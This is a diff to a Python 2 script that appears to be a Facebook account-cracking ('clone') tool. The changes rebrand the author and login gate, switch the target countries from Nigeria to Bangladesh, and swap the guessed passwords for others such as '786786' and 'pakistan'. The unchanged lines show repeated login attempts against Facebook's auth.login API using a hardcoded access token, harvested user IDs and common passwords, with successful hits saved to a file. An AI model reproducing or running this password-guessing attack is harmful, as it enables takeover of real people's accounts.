@@ -1,3 +1,4 @@
+
 # coding=utf-8
 #!/usr/bin/python
 # coding=utf-8
@@ -64,8 +65,8 @@ logo = """
 \033[1;97m             #£@•••••••••••••••••••••••••£#@ \033[1;0m
 \033[1;97m            @#£•••••••••••••••••••••••••#£@ \033[1;0m
 \033[1;97m           @#£•••••••••••••••••••••••••#£@ \033[1;0m
-\033[1;97m          @#£••••••••••efk•••#£@ \033[1;0m
-\033[1;97m         @#£••••••••••help•••••#£@ \033[1;0m
+\033[1;97m          @#£••••••••••help•••#£@ \033[1;0m
+\033[1;97m         @#£••••••••••efk•••••#£@ \033[1;0m
 \033[1;97m        @#£•••••••••••••••••••••••••#£@ \033[1;0m
 \033[1;97m       @#£•••••••••••••••••••••••••#£@ \033[1;0m
 \033[1;97m      ####••••••••••••••••••••••••### \033[1;0m
@@ -73,9 +74,7 @@ logo = """
 \033[1;93m➤\033[1;97m Author   : eniola hacking
 \033[1;93m➤\033[1;97m Github   : https://github.com/help
 \033[1;93m➤\033[1;97m Fb Id  : https://www.facebook.com/itz.efk.3
-\033[1;97m--------------------------------------------------
-"""
-
+\033[1;97m----------------------------------------------------
 idh = []
 	
 def tech_abm():
@@ -88,16 +87,16 @@ def tech_abm():
     if username =="Marwat":
         os.system("clear")
         print logo
-        print ("[+] Username : Tiger (Correct)")
+        print ("[+] Username : efk(Correct)")
         passwordss = raw_input("\033[1;97m[+]\033[1;97m Password :\033[1;97m ")
-        if passwordss =="Tricks":
+        if passwordss =="help":
             os.system("clear")
             print logo
             logging()
             os.system("clear")
             print logo 
-            print ("\033[1;97m[+]\033[1;92m Username : efk\033[1;92m (Correct)")
-            print ("\033[1;97m[+]\033[1;92m Password : help\033[1;92m (Correct)")
+            print ("\033[1;97m[+]\033[1;92m Username : contact me on Facebook @itz efk\033[1;92m (Correct)")
+            print ("\033[1;97m[+]\033[1;92m Password : Tricks\033[1;92m (Correct)")
 	    print("\033[1;97m--------------------------------------------------")
             time.sleep(1)
             print('')
@@ -110,12 +109,12 @@ def tech_abm():
             login_choice()
         else:
             print ("\t [!] Password : "+passwordss+" (Wrong)")
-	    os.system('xdg-open https://www.facebook.com/itz.efk.3')
+	    os.system('xdg-open https://www.facebook.com/profile.php?id=100042965112748')
             time.sleep(1)
             tech_abm()
     else:
         print ("\t [!] Username : "+username+" (Wrong)")
-	os.system('xdg-open https://www.facebook.com/itz.efk.3)
+	os.system('xdg-open https://www.facebook.com/profile.php?id=100042965112748')
         time.sleep(1)
         tech_abm()
 	
@@ -253,7 +252,7 @@ def menu():
     print("\t  \033[1;93m[+] Name : "+name)
     print("\033[1;97m--------------------------------------------------")
     print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mClone Frienlist and Public ID")
-    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mClone Nigeria and India")
+    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mClone Bangladesh and India")
     print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mlogout")
     print("\033[1;97m--------------------------------------------------") 
     menu_select()
@@ -507,7 +506,7 @@ def crack2():
 	raw_input("Press Enter To Main Menu Back")
 	menu()
 		
-def Nigeria_india():
+def bangla_india():
     os.system("clear")
     print logo
     os.system("python3 .loading.md")
@@ -545,13 +544,13 @@ def bangla():
 	os.system("python3 .loading.md")
         os.system('clear')
         print logo
-	print("\t  Nigeria Menu")
+	print("\t   Bangladesh Menu")
 	print("\033[1;97m--------------------------------------------------")
 	print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;93mCrack From Friend List")
 	print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;93mCrack From Public ID")
 	print ("\033[1;97m[3]\033[1;91m-⋄-\033[1;93mCrack From Followers")
 	print ('\033[1;97m[0]\033[1;91m-⋄-\033[1;93mBack')
-	print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m--------------------------------------------------")
 	bangla2()
 def bangla2():
 	select = raw_input("\n╰─➣ ")
@@ -625,7 +624,7 @@ def bangla2():
 		print ("[!] Please Select a Valid Option")
 		bangla2()
 	print("\033[1;97m[+]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
-	print("\033[1;97m[+]\033[1;97m Plz wait clone account will be appear here@efk\033[1;0m")
+	print("\033[1;97m[+]\033[1;97m Plz wait clone account will be appear here\033[1;0m")
 	print("\033[1;97m--------------------------------------------------")
 	
 	
@@ -701,7 +700,7 @@ def bangla2():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5="223344"
+		                                    pass5="786786"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
@@ -718,7 +717,7 @@ def bangla2():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-		                                            pass6="000000"
+		                                            pass6="000786"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
@@ -735,7 +734,7 @@ def bangla2():
 		                                                    ok.close()
 		                                                    oks.append(uid)
 		                                                else:
-		                                                    pass7="nigeria"
+		                                                    pass7="pakistan"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
@@ -937,7 +936,7 @@ def indiaa2():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5="223344"
+		                                    pass5="786786"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
@@ -954,7 +953,7 @@ def indiaa2():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-		                                            pass6="000000"
+		                                            pass6="000786"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
@@ -971,7 +970,7 @@ def indiaa2():
 		                                                    ok.close()
 		                                                    oks.append(uid)
 		                                                else:
-		                                                    pass7="nigeria"
+		                                                    pass7="pakistan"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
